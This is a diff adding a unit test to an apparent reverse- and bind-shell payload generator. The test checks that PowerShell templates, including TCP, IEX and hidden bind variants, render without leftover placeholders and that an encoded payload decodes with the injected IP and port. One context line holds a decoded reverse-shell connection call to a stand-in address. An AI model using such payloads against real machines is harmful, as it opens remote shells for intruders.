@@ -72,6 +72,38 @@ test('injects placeholders inside PowerShell EncodedCommand payloads', () => {
   assert.equal(decoded, '$client.Connect("192.0.2.10",4444)')
 })
 
+test('renders every direct PowerShell template without unresolved placeholders', () => {
+  const templates = [
+    ...[
+      'PowerShell #1',
+      'PowerShell #2',
+      'PowerShell #3 (Base64)',
+      'PowerShell #4 (TCP)',
+      'PowerShell #5 (IEX)',
+    ].map(name => WINDOWS_PAYLOADS[name]),
+    ...[
+      'PowerShell Bind #1',
+      'PowerShell Bind #2 (hidden)',
+    ].map(name => BIND_WINDOWS_PAYLOADS[name]),
+  ]
+
+  for (const template of templates) {
+    const rendered = injectPayloadValues(template, '127.0.0.1', '49152')
+    assert.doesNotMatch(rendered, /\{(?:ip|port)\}/)
+    assert.doesNotMatch(rendered, /\{\{|\}\}/)
+  }
+
+  const encoded = injectPayloadValues(
+    WINDOWS_PAYLOADS['PowerShell #3 (Base64)'],
+    '127.0.0.1',
+    '49152',
+  ).split(/\s+/).at(-1)
+  const decoded = Buffer.from(encoded, 'base64').toString('utf16le')
+  assert.match(decoded, /127\.0\.0\.1/)
+  assert.match(decoded, /49152/)
+  assert.doesNotMatch(decoded, /\{(?:ip|port)\}/)
+})
+
 test('normalizes legacy Python format-string braces once without collapsing nested blocks', () => {
   const renderedC = injectPayloadValues(LINUX_PAYLOADS.C, '192.0.2.10', '4444')
   const renderedCSharp = injectPayloadValues(
